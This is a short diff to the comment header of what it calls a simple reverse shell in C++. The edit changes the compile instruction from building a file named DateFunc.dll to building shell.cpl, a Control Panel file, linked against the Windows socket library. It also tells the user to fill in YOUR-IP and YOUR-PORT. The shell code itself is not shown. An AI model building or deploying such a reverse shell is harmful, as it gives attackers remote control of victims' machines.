@@ -1,5 +1,5 @@
 // This reverse shell is very simple, no agents header nor encryption
-// Compile: mingw32-c++.exe DateFunc.cpp -shared -o DateFunc.dll -static DateFunc.def
+// Compile: mingw32-c++.exe shell.cpp -shared -o shell.cpl -static -lws2_32
 // change YOUR-PORT and YOUR-IP
  
 
